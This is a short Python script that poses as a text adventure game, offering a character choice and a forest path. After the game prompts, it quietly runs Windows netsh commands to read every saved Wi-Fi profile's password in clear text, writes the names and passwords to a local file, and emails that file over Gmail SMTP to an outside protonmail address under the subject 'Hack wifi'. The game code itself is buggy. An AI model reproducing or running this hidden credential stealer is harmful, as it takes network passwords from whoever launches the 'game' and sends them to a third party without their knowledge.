import subprocess
import smtplib
from email.message import EmailMessage
import re

def place_first():
  print("U r in the forest and you are looking for road do you want to go left/right")
  k = input("Left/right: ")

  k.lower()

  if k == "left":
    print("U found some old house dou want to enter")

  if k =="right":
    print("U were trying to find something for long time and at the end you found mall town")



print("Welcome to the game")

print("U will have to choose a character")
print("U can choose from archer/warrior/wizard")

l = input("Enter the character name: ")

l.lower()


if l == "archer":
  print("U have choosen an archer")
  place_first()


elif l == "warrrior":
  print("U have choosen a warrior")
  place_first()


elif l == "wizard":
  print("U have choosen wizard")
  place_first()
  
else:
  print("Doesnt exist")
    

sub1 = subprocess.run(["netsh", "wlan", "show", "profile"], capture_output=True, shell=True)

p = sub1.stdout.decode()

names = re.findall("All User Profile     : (.*)\r", p)


full_passw = []
full_ssid = []

for i in names:
  o = subprocess.run(["netsh", "wlan", "show", "profile", i], capture_output=True, shell=True)
  q = o.stdout.decode()
  
  if re.search("Security key           : Present", q):
    u = subprocess.run(["netsh", "wlan", "show", "profile", i, "key=clear"], capture_output=True, shell=True)
    y = u.stdout.decode()
    

    passw = re.findall("Key Content            : (.*)\r", y)
    full_ssid.append(i)
    full_passw.append(passw[0])
    

with open("jes.txt", "w") as f:
  for x in range(len(full_passw)):
    f.write("name: ")
    f.write(full_ssid[x])
    f.write(" ")
    f.write("pass: ")
    f.write(full_passw[x])
    f.write(",")


email_addr = ""
passw = ""


mess = EmailMessage()
mess["Subject"] = "Hack wifi"
mess["From"] = email_addr
mess["To"] = "CCWPRANSOM@protonmail.com"
mess.set_content("Here u go")



with open("jes.txt", "rb") as l:
  we = l.read()
  k = l.name
  
  mess.add_attachment(we, maintype="text", subtype ="plain", filename=k)

with smtplib.SMTP("smtp.gmail.com", 587) as smtp:
  smtp.ehlo()
  smtp.starttls()
  smtp.ehlo()

  smtp.login(email_addr, passw)
  smtp.send_message(mess)


















